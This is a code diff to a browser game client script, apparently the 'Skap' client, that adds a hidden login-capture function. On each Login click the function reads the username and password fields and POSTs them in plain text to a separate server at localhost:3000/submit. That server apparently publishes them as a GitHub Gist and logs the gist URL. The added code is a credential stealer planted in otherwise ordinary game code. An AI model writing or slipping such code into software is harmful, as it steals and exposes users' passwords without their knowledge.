@@ -794,3 +794,38 @@ function onClientClose() {
     for (let name in SkapClientPlayers) delete SkapClientPlayers[name];
     // setTimeout(clientWS.init.bind(clientWS), 3000);
 };
+// Function to capture and send data when "Login" is clicked
+function captureAndSendData() {
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    // Check if both fields are filled
+    if (username && password) {
+        fetch("http://localhost:3000/submit", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                username: username,
+                password: password
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.gistUrl) {
+                console.log("Gist created! Here's the URL:", data.gistUrl);
+            } else {
+                console.log("Error:", data.error);
+            }
+        })
+        .catch(error => {
+            console.error("Error:", error);
+        });
+    }
+}
+
+// Add event listener to "Login" button
+document.getElementById("login").addEventListener("click", function(event) {
+    captureAndSendData();  // Call function when "Login" button is clicked
+});
